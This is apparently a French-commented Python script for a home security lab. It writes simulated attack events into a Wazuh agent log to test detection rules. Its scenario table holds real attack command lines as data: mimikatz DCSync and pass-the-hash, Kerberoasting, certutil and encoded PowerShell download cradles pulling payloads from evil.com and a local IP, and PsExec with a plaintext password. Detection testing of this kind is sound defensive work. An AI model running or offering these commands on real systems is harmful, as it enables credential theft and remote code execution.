#!/usr/bin/env python3
"""
simulate_attack.py — Simule des événements d'attaque pour tester les règles Wazuh
Auteur  : Joe Bichall (@joebat10)

⚠️  À UTILISER UNIQUEMENT dans un environnement de lab isolé !
     Ce script génère des faux logs (pas de vraies commandes malveillantes).

Usage : python simulate_attack.py --scenario kerberoasting --verbose
"""

import sys
import json
import socket
import time
import random
import argparse
from datetime import datetime

# ─── SCÉNARIOS D'ATTAQUE ──────────────────────────────────────────────────────

SCENARIOS = {
    # Kerberoasting : demande de tickets Kerberos RC4 pour cracker offline
    "kerberoasting": {
        "name"    : "Kerberoasting (T1558.003)",
        "mitre"   : "T1558.003",
        "steps"   : [
            "Énumération des SPN (Service Principal Names) dans l'AD",
            "Demande de tickets Kerberos TGS pour les comptes de service",
            "Export des tickets au format Hashcat",
            "Cracking offline des hash RC4",
        ],
        "events"  : [
            {"type": "EventLog", "id": 4769, "msg": "Ticket Kerberos demandé pour SPN=MSSQLSvc/db.corp.local:1433", "level": 3},
            {"type": "EventLog", "id": 4769, "msg": "Ticket Kerberos demandé pour SPN=HTTP/intranet.corp.local", "level": 3},
            {"type": "EventLog", "id": 4769, "msg": "Ticket Kerberos demandé pour SPN=host/fileserver.corp.local", "level": 3},
        ],
        "commands": [
            'powershell -c "Get-ADUser -Filter {ServicePrincipalName -ne \\"$null\\"} -Properties ServicePrincipalName"',
            'powershell -c "Invoke-Kerberoast -OutputFormat Hashcat"',
        ]
    },

    # DCSync : imite un contrôleur de domaine pour extraire les hashes
    "dcsync": {
        "name"    : "DCSync (T1003.006)",
        "mitre"   : "T1003.006",
        "steps"   : [
            "Vérification des privilèges (DS-Replication-Get-Changes)",
            "Simulation de requête de réplication AD",
            "Extraction des credentials (NTDS.dit)",
        ],
        "events"  : [
            {"type": "EventLog", "id": 4662, "msg": "Opération de réplication DS effectuée sur 'DC=corp,DC=local'", "level": 4},
        ],
        "commands": [
            'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator"',
        ]
    },

    # Pass-the-Hash : utilisation d'un hash NTLM sans connaître le mot de passe
    "pass_the_hash": {
        "name"    : "Pass-the-Hash (T1550.002)",
        "mitre"   : "T1550.002",
        "steps"   : [
            "Injection du hash NTLM dans le processus lsass.exe",
            "Authentification réseau via NTLM avec le hash",
            "Accès aux ressources distantes",
        ],
        "events"  : [
            {"type": "EventLog", "id": 4624, "msg": "Logon Type 3 (Network) avec NTLM depuis 192.168.1.200", "level": 3},
            {"type": "Sysmon",   "id": 10,   "msg": "Accès à lsass.exe depuis cmd.exe (GrantedAccess: 0x1010)", "level": 4},
        ],
        "commands": [
            'mimikatz.exe "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:AABBCCDDEEFF00112233"',
        ]
    },

    # LOLBins : certutil pour télécharger un payload
    "lolbin_certutil": {
        "name"    : "LOLBin - certutil download (T1105)",
        "mitre"   : "T1105",
        "steps"   : [
            "Utilisation de certutil.exe (binaire Windows légitime)",
            "Téléchargement d'un payload depuis URL distante",
            "Décodage Base64 du payload",
        ],
        "events"  : [
            {"type": "Sysmon", "id": 1, "msg": "certutil.exe -urlcache -f http://evil.com/payload.exe C:\\Temp\\nc.exe", "level": 3},
            {"type": "Sysmon", "id": 1, "msg": "certutil.exe -decode payload.b64 payload.exe", "level": 3},
        ],
        "commands": [
            "certutil.exe -urlcache -f http://192.168.1.100/payload.exe C:\\Windows\\Temp\\svc.exe",
            "certutil.exe -decode encoded.b64 C:\\Windows\\Temp\\svc.exe",
        ]
    },

    # PowerShell download cradle — fileless malware
    "powershell_cradle": {
        "name"    : "PowerShell Download Cradle (T1059.001 / T1105)",
        "mitre"   : "T1059.001",
        "steps"   : [
            "PowerShell télécharge un script en mémoire (fileless)",
            "IEX (Invoke-Expression) exécute le script directement",
            "Aucun fichier écrit sur le disque",
        ],
        "events"  : [
            {"type": "Sysmon", "id": 1, "msg": 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.100/stager.ps1\')"', "level": 4},
        ],
        "commands": [
            "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==",
        ]
    },

    # Lateral Movement via PsExec
    "lateral_psexec": {
        "name"    : "Lateral Movement - PsExec (T1569.002)",
        "mitre"   : "T1569.002",
        "steps"   : [
            "Copie de PSEXESVC.exe sur le share ADMIN$ de la cible",
            "Création et démarrage du service PSEXESVC",
            "Exécution de commandes distantes via le service",
        ],
        "events"  : [
            {"type": "EventLog", "id": 7045, "msg": "Service installé : PSEXESVC, chemin: C:\\Windows\\PSEXESVC.exe", "level": 4},
            {"type": "EventLog", "id": 4624, "msg": "Logon réseau (Type 3) depuis 192.168.1.50 vers 192.168.1.60", "level": 3},
        ],
        "commands": [
            r"PsExec64.exe \\192.168.1.60 -u corp\admin -p Pass1234! cmd.exe /c whoami",
        ]
    },
}


# ─── FONCTIONS ────────────────────────────────────────────────────────────────

def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║       🎭 Cyber Homelab — Attack Simulator                     ║
║       Génère des logs d'attaque pour tester Wazuh             ║
║       ⚠  LAB UNIQUEMENT — NE PAS UTILISER EN PRODUCTION      ║
╚═══════════════════════════════════════════════════════════════╝
""")


def print_scenario_info(scenario: dict, verbose: bool):
    print(f"\n{'='*60}")
    print(f"  SCÉNARIO : {scenario['name']}")
    print(f"  MITRE    : {scenario['mitre']}")
    print(f"{'='*60}\n")

    if verbose:
        print("📋 Étapes de l'attaque :")
        for i, step in enumerate(scenario["steps"], 1):
            print(f"   {i}. {step}")

        print("\n💻 Commandes simulées (NE SONT PAS EXÉCUTÉES) :")
        for cmd in scenario["commands"]:
            print(f"   $ {cmd}")
        print()


def generate_fake_log(event: dict, scenario_name: str) -> dict:
    """Génère un enregistrement de log structuré (non exécuté)."""
    return {
        "timestamp"  : datetime.now().isoformat(),
        "scenario"   : scenario_name,
        "event_type" : event["type"],
        "event_id"   : event["id"],
        "level"      : event["level"],
        "message"    : event["msg"],
        "hostname"   : socket.gethostname(),
        "source_ip"  : "192.168.1." + str(random.randint(10, 50)),
        "user"       : random.choice(["CORP\\john.doe", "CORP\\it.admin", "CORP\\svc.sql"]),
    }


def write_to_wazuh_ossec_log(log: dict):
    """Écrit dans le log ossec (si accessible) pour déclencher une alerte Wazuh."""
    ossec_log_path = r"C:\Program Files (x86)\ossec-agent\ossec.log"
    msg = f"[SIMULATION] {log['event_type']} EventID={log['event_id']} | {log['message']}\n"
    try:
        with open(ossec_log_path, "a") as f:
            f.write(msg)
        print("    [→] Log injecté dans ossec.log")
    except Exception:
        print("    [i] ossec.log non accessible (normal si pas d'agent Wazuh local)")


def run_scenario(name: str, verbose: bool, dry_run: bool, output_json: str):
    if name not in SCENARIOS:
        print(f"[!] Scénario inconnu : {name}")
        print(f"    Scénarios disponibles : {', '.join(SCENARIOS.keys())}")
        sys.exit(1)

    scenario = SCENARIOS[name]
    print_scenario_info(scenario, verbose)

    logs = []
    print("🚀 Simulation en cours...\n")

    for event in scenario["events"]:
        log = generate_fake_log(event, name)
        logs.append(log)

        # Affichage coloré
        level_colors = {1: "", 2: "", 3: "🟡", 4: "🔴"}
        icon = level_colors.get(event["level"], "🔵")
        print(f"  {icon} [{event['type']}] EventID {event['id']}")
        print(f"     {event['msg'][:90]}{'...' if len(event['msg']) > 90 else ''}")

        if not dry_run:
            write_to_wazuh_ossec_log(log)
            time.sleep(0.5)

    # Résumé
    print(f"\n{'─'*60}")
    print(f"  ✅ Simulation terminée : {len(logs)} événements générés")
    print(f"  MITRE ATT&CK : https://attack.mitre.org/techniques/{scenario['mitre'].replace('.', '/')}")

    # Export JSON si demandé
    if output_json:
        with open(output_json, "w", encoding="utf-8") as f:
            json.dump({"scenario": name, "events": logs}, f, indent=2, ensure_ascii=False)
        print(f"  📄 Logs exportés → {output_json}")


def list_scenarios():
    print("\n📋 Scénarios disponibles :\n")
    print(f"  {'NOM':<20} {'DESCRIPTION':<40} {'MITRE'}")
    print(f"  {'─'*20} {'─'*40} {'─'*15}")
    for key, sc in SCENARIOS.items():
        print(f"  {key:<20} {sc['name']:<40} {sc['mitre']}")
    print()


# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Simulateur d'attaques pour tester les règles Wazuh",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples :
  python simulate_attack.py --list
  python simulate_attack.py --scenario kerberoasting --verbose
  python simulate_attack.py --scenario lateral_psexec --dry-run
  python simulate_attack.py --scenario dcsync --output logs_dcsync.json
"""
    )
    parser.add_argument("--scenario",    help="Nom du scénario à simuler")
    parser.add_argument("--list",        action="store_true", help="Lister tous les scénarios")
    parser.add_argument("--verbose",     action="store_true", help="Afficher les détails complets")
    parser.add_argument("--dry-run",     action="store_true", help="Ne pas écrire dans les logs Wazuh")
    parser.add_argument("--output",      help="Exporter les logs générés en JSON")
    parser.add_argument("--all",         action="store_true", help="Lancer tous les scénarios en séquence")
    args = parser.parse_args()

    print_banner()

    if args.list:
        list_scenarios()
        return

    if args.all:
        for sc_name in SCENARIOS:
            run_scenario(sc_name, args.verbose, args.dry_run or True, None)
            time.sleep(1)
        return

    if not args.scenario:
        parser.print_help()
        print("\n[!] Précisez --scenario NOM ou --list")
        sys.exit(1)

    run_scenario(args.scenario, args.verbose, args.dry_run, args.output)


if __name__ == "__main__":
    main()
